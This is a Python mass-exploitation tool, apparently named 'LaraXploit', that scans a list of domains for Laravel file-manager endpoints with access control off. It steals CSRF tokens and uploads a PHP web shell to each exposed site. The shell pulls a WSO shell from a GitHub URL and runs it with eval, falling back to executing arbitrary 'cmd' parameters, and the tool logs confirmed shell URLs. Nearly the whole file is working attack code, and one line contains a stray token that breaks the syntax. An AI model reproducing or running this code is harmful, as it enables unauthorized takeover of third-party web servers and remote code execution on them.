import os
import sys
import json
import re
import signal
import random
import string
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Back, Style
import requests
import urllib3
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ENDPOINTS = [
    "/file-manager/initialize",
    "/filemanager/initialize", 
    "/laravel-file-manager/initialize",
    "/laravel-filemanager/initialize",
]
WEAK_SITES = "weak_sites.txt"
SHELLS_DEPLOYED = "uploads_deployed.txt"
SHELLS_ONLY = "shells.txt"
stats = {"scanned": 0, "weak": 0, "shells": 0}
stats_lock = __import__('threading').Lock()
running = True
uploaded_domains = set()
def print_info(message):
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} {message}")
def print_success(message):
    print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {message}")
def print_error(message):
    print(f"{Fore.RED}[ERR]{Style.RESET_ALL} {message}")
def print_warning(message):
    print(f"{Fore.YELLOW}[WRN]{Style.RESET_ALL} {message}")
def print_vulnerable(url, acl, disks):
    print(f"{Fore.RED}[VULN]{Style.RESET_ALL} {Fore.RED}{url}{Style.RESET_ALL}")
    print(f"      {Fore.CYAN}acl{Style.RESET_ALL}  : {Fore.RED}false{Style.RESET_ALL}")
    print(f"      {Fore.CYAN}disks{Style.RESET_ALL}: {Fore.YELLOW}{', '.join(disks) if disks else 'none detected'}{Style.RESET_ALL}")
def print_csrf(url, token):
    print(f"      {Fore.MAGENTA}[CSRF]{Style.RESET_ALL} found at {Fore.CYAN}{url}{Style.RESET_ALL}")
    print(f"      {Fore.MAGENTA}[CSRF]{Style.RESET_ALL} {Fore.WHITE}{token[:28]}...{Style.RESET_ALL}")
def print_upload(disk):
    print(f"      {Fore.GREEN}[UPLOAD]{Style.RESET_ALL} success on {Fore.YELLOW}disk={disk}{Style.RESET_ALL}")
def print_shell(url, status):
    if status == "confirmed":
        print(f"      {Fore.GREEN}[SHELL]{Style.RESET_ALL} {Fore.GREEN}confirmed → {Fore.CYAN}{url}{Style.RESET_ALL}")
    elif status == "uploaded":
        print(f"      {Fore.YELLOW}[SHELL]{Style.RESET_ALL} {Fore.YELLOW}uploaded → {Fore.CYAN}{url}{Style.RESET_ALL}")
    else:
        print(f"      {Fore.WHITE}[SHELL]{Style.RESET_ALL} {Fore.WHITE}{url}{Style.RESET_ALL}")
def print_secure(url):
    print(f"{Fore.GREEN}[SECURE]{Style.RESET_ALL} {Fore.GREEN}{url}{Style.RESET_ALL}")
def extract_domain(url):
    parsed = urlparse(url)
    return parsed.netloc
def make_headers():
    user_agents = [21qw
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json, */*",
        "Accept-Language": "en-US,en;q=0.9",
    }
def random_shell_name():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".php"
def build_shell_payload(marker):
    php_code = f"""<?php
$marker = '{marker}';
$github_shell = 'https://raw.githubusercontent.com/0xFlamy/EviL/refs/heads/main/WSO-Shell.txt';
$shell = @file_get_contents($github_shell);
if($shell) {{
    eval('?>' . $shell);
}} else {{
    if(isset($_REQUEST['cmd'])) system($_REQUEST['cmd']);
}}
echo $marker;
?>"""
    return php_code.encode()
def normalize_target(raw):
    raw = raw.strip()
    if raw.startswith(("http://", "https://")):
        return [raw.rstrip("/")]
    return [f"https://{raw.rstrip('/')}", f"http://{raw.rstrip('/')}"]
def extract_csrf_token(html):
    patterns = [
        r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)',
        r'content=["\']([^"\']+)["\'][^>]*name=["\']csrf-token["\'][^>]*',
        r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']_token["\'][^>]*',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None
def append_to_file(filepath, line):
    with stats_lock:
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(line + "\n")
def update_stats(key):
    with stats_lock:
        stats[key] += 1
TIMEOUT = 12
CSRF_ENDPOINTS = [
    "/login", "/admin/login","/admin", "/register", "/sign-up", "/signup",
    "/auth/login", "/auth", "/user/login", "/user", "/panel/login", "/panel",
    "/dashboard/login", "/dashboard", "/account/login", "/account", "/member/login",
    "/member", "/contact-us", "/contact", "/support", "/aboutus", "/about-us",
]
def get_csrf_token(session, base_url, init_endpoint):
    if not running:
        return None
    base_path = init_endpoint.rsplit("/initialize", 1)[0]
    urls_to_check = [
        base_url + init_endpoint,
        base_url + base_path,
        base_url,
    ]
    urls_to_check.extend([base_url + path for path in CSRF_ENDPOINTS])
    for url in urls_to_check:
        if not running:
            return None
        try:
            response = session.get(url, headers=make_headers(), timeout=TIMEOUT)
            token = extract_csrf_token(response.text)
            if token:
                print_csrf(url, token)
                return token
        except Exception:
            continue
    return None
def verify_shell_access(session, shell_url, marker):
    if not running:
        return "unknown"
    try:
        response = session.get(shell_url, headers=make_headers(), timeout=TIMEOUT)
        response_text = response.text
        if "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>" in response_text:
            return "confirmed"
        elif marker in response_text:
            return "confirmed"
        elif response.status_code == 200:
            return "uploaded"
        else:
            return "unverified"
    except Exception as e:
        return "unverified"
def perform_exploit(session, base_url, endpoint_path, disk_name):
    if not running:
        return None, None
    shell_filename = random_shell_name()
    marker_string = shell_filename[:-4]
    shell_content = build_shell_payload(marker_string)
    csrf_token = get_csrf_token(session, base_url, endpoint_path)
    if not csrf_token:
        return None, None
    upload_endpoint = endpoint_path.replace("/initialize", "/upload")
    exploit_headers = {
        **make_headers(),
        "X-CSRF-TOKEN": csrf_token,
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        response = session.post(
            base_url + upload_endpoint,
            headers=exploit_headers,
            files={"files[]": (shell_filename, shell_content, "application/x-php")},
            data={"disk": disk_name, "path": "", "overwrite": "1"},
            timeout=TIMEOUT
        )
        result_data = response.json()
        if result_data.get("result", {}).get("status") == "success":
            print_upload(disk_name)
        else:
            return None, None
    except Exception:
        return None, None
    url_endpoint = endpoint_path.replace("/initialize", "/url")
    try:
        response = session.get(
            base_url + url_endpoint,
            headers=exploit_headers,
            params={"disk": disk_name, "path": shell_filename},
            timeout=TIMEOUT
        )
        raw_url = response.json().get("url", "")
        if not raw_url:
            return None, None
        if raw_url.startswith("/"):
            parsed = urlparse(base_url)
            final_url = f"{parsed.scheme}://{parsed.netloc}{raw_url}"
        else:
            final_url = raw_url
        shell_status = verify_shell_access(session, final_url, marker_string)
        return final_url, shell_status
    except Exception:
        return None, None
MaxThreadsForPool = 120
def scan_target(target_url):
    global running
    if not running:
        return
    update_stats("scanned")
    candidates = normalize_target(target_url)
    for current_base in candidates:
        if not running:
            return
        session = requests.Session()
        session.verify = False
        session.headers.update(make_headers())
        for endpoint in ENDPOINTS:
            if not running:
                session.close()
                return
            full_endpoint_url = current_base + endpoint
            try:
                response = session.get(full_endpoint_url, timeout=TIMEOUT)
            except requests.exceptions.ConnectionError:
                print_error(f"{full_endpoint_url} → TimeOut")
                continue
            except requests.exceptions.Timeout:
                continue
            except Exception:
                continue
            if response.status_code in (401, 403):
                print_warning(f"{full_endpoint_url} → {response.status_code}")
                continue
            if response.status_code != 200:
                continue
            try:
                json_data = response.json()
                config_data = json_data.get("config", json_data)
                acl_enabled = config_data.get("acl", True)
                if acl_enabled is not False:
                    print_secure(full_endpoint_url)
                    continue
                available_disks = list(config_data.get("disks", {}).keys())
                print_vulnerable(full_endpoint_url, acl_enabled, available_disks)
                append_to_file(WEAK_SITES, f"{full_endpoint_url} | disks={available_disks}")
                update_stats("weak")
                for disk in available_disks:
                    if not running:
                        session.close()
                        return
                    shell_url, shell_status = perform_exploit(session, current_base, endpoint, disk)
                    if shell_url:
                        print_shell(shell_url, shell_status)
                        status_label = shell_status.upper() if shell_status else "UNKNOWN"
                        append_to_file(SHELLS_DEPLOYED, f"[{status_label}] {shell_url} | source={full_endpoint_url} | disk={disk}")
                        update_stats("shells")
                        if shell_status == "confirmed":
                            domain = extract_domain(shell_url)
                            if domain not in uploaded_domains:
                                uploaded_domains.add(domain)
                                with stats_lock:
                                    with open(SHELLS_ONLY, "a", encoding="utf-8") as f:
                                        f.write(shell_url + "\n")
                                print_success(f"Saved to {SHELLS_ONLY}: {shell_url}")
                    else:
                        print_error(f"Exploit failed for {full_endpoint_url} disk={disk}")

            except Exception as e:
                continue
        session.close()
        break
def handle_interrupt(signum, frame):
    global running
    print(f"\n\n{Fore.RED}[!] Ctrl+C detected. Terminating gracefully...{Style.RESET_ALL}")
    running = False
    sys.exit(0)
def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{Fore.YELLOW}Developed by {Fore.WHITE}[{Style.RESET_ALL}{Fore.GREEN}FLAMY{Style.RESET_ALL}]

██████ ▄▄     ▄▄▄  ▄▄   ▄▄ ▄▄ ▄▄ ██  ██  ▄▄▄   ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄  
██▄▄   ██    ██▀██ ██▀▄▀██ ▀███▀ ██████ ██▀██ ██▀▀▀ ██▄█▀ ██▄▄  ██▄█▄ 
██     ██▄▄▄ ██▀██ ██   ██   █   ██  ██ ██▀██ ▀████ ██ ██ ██▄▄▄ ██ ██

                    [ {Fore.YELLOW}LaraXploit{Style.RESET_ALL} {Fore.RED}v1.3.0{Style.RESET_ALL}]
  --| Telegram: {Fore.GREEN}https://t.me/Red0ps{Style.RESET_ALL} |--\n""")
def main():
    global running
    signal.signal(signal.SIGINT, handle_interrupt)
    if os.path.exists(SHELLS_ONLY):
        os.remove(SHELLS_ONLY)
    show_banner()
    target_file = input(f"{Fore.YELLOW}Enter Your DomainList : {Style.RESET_ALL}").strip()
    try:
        with open(target_file, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"\n{Fore.RED}[!] Unable to load targets. File not found or inaccessible...{Style.RESET_ALL}")
        sys.exit(1)
    if not targets:
        print(f"\n{Fore.RED}[!] No targets found in file...{Style.RESET_ALL}")
        sys.exit(1)
    #print(f"\n{Fore.CYAN}[INFO]{Fore.WHITE} Tools initialized. Target scan starting...{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[ATTACK STARTED]{'_'*68}{Style.RESET_ALL}")
    with ThreadPoolExecutor(max_workers=MaxThreadsForPool) as executor:
        future_to_target = {executor.submit(scan_target, t): t for t in targets}
        try:
            for future in as_completed(future_to_target):
                if not running:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    future.result(timeout=5)
                except Exception:
                    pass
        except KeyboardInterrupt:
            handle_interrupt(None, None)
    print(f"{Fore.GREEN}[ATTACK COMPLETED]{'_'*66}{Style.RESET_ALL}")
    print(f"\t\t\t\t{Fore.RED}Developed by {Fore.YELLOW}RedOps™ Tools{Style.RESET_ALL}")
if __name__ == "__main__":
    main()
